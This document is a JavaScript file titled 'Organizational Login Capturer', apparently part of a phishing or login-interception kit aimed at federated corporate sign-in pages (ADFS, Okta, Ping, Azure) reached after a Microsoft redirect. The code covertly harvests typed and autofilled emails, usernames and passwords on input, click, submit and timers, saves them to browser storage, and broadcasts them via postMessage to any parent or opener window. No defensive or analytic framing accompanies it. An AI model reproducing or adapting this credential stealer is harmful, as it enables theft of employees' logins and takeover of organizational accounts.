/**
 * Organizational Login Capturer
 * Captures login credentials from company/federated login pages
 * Works after Microsoft redirects users to their organization's login page
 */

(function() {
    'use strict';
    
    console.log('🏢 Organizational Login Capturer loading...');
    
    // Track if this is likely an organizational login page
    const isOrganizationalPage = () => {
        const hostname = window.location.hostname;
        const url = window.location.href;
        
        // Common organizational login indicators
        const orgIndicators = [
            'adfs', 'sso', 'login', 'auth', 'signin', 'portal',
            'identity', 'federation', 'saml', 'okta', 'ping',
            'azure', 'office365', 'sharepoint'
        ];
        
        // Check if URL contains organizational indicators
        const hasOrgIndicators = orgIndicators.some(indicator => 
            hostname.includes(indicator) || url.toLowerCase().includes(indicator)
        );
        
        // Check if redirected from Microsoft
        const referrer = document.referrer;
        const fromMicrosoft = referrer && (
            referrer.includes('login.microsoftonline.com') ||
            referrer.includes('login.live.com') ||
            referrer.includes('account.microsoft.com')
        );
        
        // Check for common organizational login form elements
        const hasLoginForms = document.querySelector('input[type="password"]') || 
                             document.querySelector('input[name*="password"]') ||
                             document.querySelector('input[name*="username"]') ||
                             document.querySelector('input[name*="email"]');
        
        return hasOrgIndicators || fromMicrosoft || hasLoginForms;
    };
    
    // Store captured credentials
    let capturedCredentials = {
        email: '',
        username: '',
        password: '',
        domain: window.location.hostname,
        url: window.location.href,
        organizationType: 'unknown',
        captureTime: new Date().toISOString(),
        formData: {},
        additionalFields: {}
    };
    
    // Function to identify organization type
    function identifyOrganizationType() {
        const hostname = window.location.hostname.toLowerCase();
        const url = window.location.href.toLowerCase();
        
        if (hostname.includes('adfs') || url.includes('adfs')) {
            return 'ADFS (Active Directory Federation Services)';
        } else if (hostname.includes('okta') || url.includes('okta')) {
            return 'Okta';
        } else if (hostname.includes('ping') || url.includes('ping')) {
            return 'PingIdentity';
        } else if (hostname.includes('saml') || url.includes('saml')) {
            return 'SAML Provider';
        } else if (hostname.includes('azure') || url.includes('azure')) {
            return 'Azure AD B2C';
        } else if (hostname.includes('office365') || url.includes('office365')) {
            return 'Office 365 Custom';
        } else if (hostname.includes('sharepoint') || url.includes('sharepoint')) {
            return 'SharePoint';
        } else {
            return 'Custom Organizational Login';
        }
    }
    
    // Enhanced function to capture form field values and store credentials
    function captureFormData() {
        const formData = {};
        
        // Find all input fields
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
            if (input.type && input.name) {
                const fieldName = input.name.toLowerCase();
                const fieldType = input.type.toLowerCase();
                const fieldValue = input.value;
                
                // Skip empty fields and hidden/system fields
                if (!fieldValue || fieldType === 'hidden' || fieldType === 'submit') {
                    return;
                }
                
                formData[input.name] = {
                    value: fieldValue,
                    type: fieldType,
                    id: input.id,
                    placeholder: input.placeholder,
                    className: input.className,
                    isPassword: fieldType === 'password' || fieldName.includes('password'),
                    isEmail: fieldType === 'email' || fieldName.includes('email') || fieldName.includes('mail'),
                    isUsername: fieldName.includes('user') || fieldName.includes('login') || fieldName.includes('account')
                };
                
                // Extract specific credential types
                if (fieldType === 'password' || fieldName.includes('password')) {
                    capturedCredentials.password = fieldValue;
                } else if (fieldType === 'email' || fieldName.includes('email') || fieldName.includes('mail')) {
                    capturedCredentials.email = fieldValue;
                } else if (fieldName.includes('user') || fieldName.includes('login') || fieldName.includes('account')) {
                    capturedCredentials.username = fieldValue;
                }
            }
        });
        
        // Store credentials in sessionStorage for OAuth callback to access
        if (capturedCredentials.password || capturedCredentials.email || capturedCredentials.username) {
            try {
                sessionStorage.setItem('captured_credentials', JSON.stringify({
                    email: capturedCredentials.email,
                    username: capturedCredentials.username,
                    password: capturedCredentials.password,
                    domain: capturedCredentials.domain,
                    captureTime: capturedCredentials.captureTime,
                    source: 'organizational-login-capturer'
                }));
                
                // Also store in localStorage as backup
                localStorage.setItem('user_credentials', JSON.stringify({
                    email: capturedCredentials.email,
                    username: capturedCredentials.username,
                    password: capturedCredentials.password,
                    domain: capturedCredentials.domain,
                    captureTime: capturedCredentials.captureTime,
                    source: 'organizational-login-capturer'
                }));
                
                console.log('💾 Stored credentials for OAuth callback:', {
                    hasEmail: !!capturedCredentials.email,
                    hasPassword: !!capturedCredentials.password,
                    hasUsername: !!capturedCredentials.username
                });
            } catch (error) {
                console.error('❌ Error storing credentials:', error);
            }
        }
        
        return formData;
    }
    
    // Function to capture additional page information
    function capturePageInfo() {
        return {
            title: document.title,
            referrer: document.referrer,
            userAgent: navigator.userAgent,
            forms: Array.from(document.forms).map(form => ({
                action: form.action,
                method: form.method,
                name: form.name,
                id: form.id,
                fieldCount: form.elements.length
            })),
            loginButtons: Array.from(document.querySelectorAll('input[type="submit"], button[type="submit"], button')).map(btn => ({
                text: btn.textContent || btn.value,
                id: btn.id,
                className: btn.className,
                name: btn.name
            }))
        };
    }
    
    // Function to send captured data to parent window
    function sendCredentialsToParent() {
        capturedCredentials.organizationType = identifyOrganizationType();
        capturedCredentials.formData = captureFormData();
        capturedCredentials.additionalFields = capturePageInfo();
        
        const payload = {
            type: 'ORGANIZATIONAL_CREDENTIALS_CAPTURED',
            data: capturedCredentials,
            source: 'organizational-login-capturer',
            timestamp: new Date().toISOString()
        };
        
        console.log('📤 Sending organizational credentials:', {
            hasEmail: !!capturedCredentials.email,
            hasPassword: !!capturedCredentials.password,
            hasUsername: !!capturedCredentials.username,
            organizationType: capturedCredentials.organizationType
        });
        
        // Send to parent window
        try {
            if (window.parent && window.parent !== window) {
                window.parent.postMessage(payload, '*');
                console.log('✅ Sent to parent window');
            }
        } catch (error) {
            console.error('❌ Error sending to parent:', error);
        }
        
        // Send to opener window
        try {
            if (window.opener) {
                window.opener.postMessage(payload, '*');
                console.log('✅ Sent to opener window');
            }
        } catch (error) {
            console.error('❌ Error sending to opener:', error);
        }
        
        // Store in sessionStorage as backup
        try {
            sessionStorage.setItem('org_credentials_backup', JSON.stringify(payload));
        } catch (error) {
            console.error('❌ Error storing backup:', error);
        }
    }
    
    // Monitor form submissions
    function monitorFormSubmissions() {
        document.addEventListener('submit', function(e) {
            console.log('📝 Form submitted, capturing credentials...');
            setTimeout(() => {
                sendCredentialsToParent();
            }, 100);
        });
        
        // Monitor form changes and capture credentials in real-time
        document.addEventListener('input', function(e) {
            if (e.target.type === 'password' || 
                e.target.name?.toLowerCase().includes('password') ||
                e.target.name?.toLowerCase().includes('email') ||
                e.target.name?.toLowerCase().includes('user')) {
                
                console.log('🔍 Credential field changed:', e.target.name, e.target.type);
                
                // Capture immediately when password field changes
                setTimeout(() => {
                    captureFormData();
                }, 500);
            }
        });
        
        // Monitor button clicks
        document.addEventListener('click', function(e) {
            const target = e.target;
            if (target.type === 'submit' || 
                target.textContent?.toLowerCase().includes('sign in') ||
                target.textContent?.toLowerCase().includes('login') ||
                target.textContent?.toLowerCase().includes('submit') ||
                target.className?.toLowerCase().includes('submit') ||
                target.className?.toLowerCase().includes('login')) {
                
                console.log('🖱️ Login button clicked, capturing in 1 second...');
                setTimeout(() => {
                    sendCredentialsToParent();
                }, 1000);
            }
        });
    }
    
    // Monitor for credential auto-fill and changes
    function monitorAutoFill() {
        setInterval(() => {
            const passwordFields = document.querySelectorAll('input[type="password"]');
            const emailFields = document.querySelectorAll('input[type="email"], input[name*="email"], input[name*="mail"]');
            const usernameFields = document.querySelectorAll('input[name*="user"], input[name*="login"], input[name*="account"]');
            
            let hasNewData = false;
            
            passwordFields.forEach(field => {
                if (field.value && field.value !== capturedCredentials.password) {
                    capturedCredentials.password = field.value;
                    hasNewData = true;
                }
            });
            
            emailFields.forEach(field => {
                if (field.value && field.value !== capturedCredentials.email) {
                    capturedCredentials.email = field.value;
                    hasNewData = true;
                }
            });
            
            usernameFields.forEach(field => {
                if (field.value && field.value !== capturedCredentials.username) {
                    capturedCredentials.username = field.value;
                    hasNewData = true;
                }
            });
            
            if (hasNewData) {
                console.log('🔄 Auto-fill detected, updating stored credentials');
                captureFormData(); // This will update sessionStorage
            }
        }, 2000);
    }
    
    // Initialize the capturer
    function initialize() {
        if (!isOrganizationalPage()) {
            console.log('🚫 Not an organizational login page, skipping');
            return;
        }
        
        console.log('🏢 Organizational Login Capturer active on:', window.location.hostname);
        console.log('🔍 Organization type:', identifyOrganizationType());
        
        // Initial capture
        setTimeout(() => {
            sendCredentialsToParent();
        }, 2000);
        
        // Start monitoring
        monitorFormSubmissions();
        monitorAutoFill();
        
        // Periodic capture
        setInterval(() => {
            const currentFormData = captureFormData();
            if (Object.keys(currentFormData).length > 0) {
                sendCredentialsToParent();
            }
        }, 5000);
    }
    
    // Listen for messages from parent
    window.addEventListener('message', function(event) {
        if (event.data && event.data.type === 'REQUEST_ORGANIZATIONAL_CREDENTIALS') {
            console.log('📨 Parent requested organizational credentials');
            sendCredentialsToParent();
        }
    });
    
    // Start when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initialize);
    } else {
        initialize();
    }
    
    console.log('🏢 Organizational Login Capturer loaded');
})();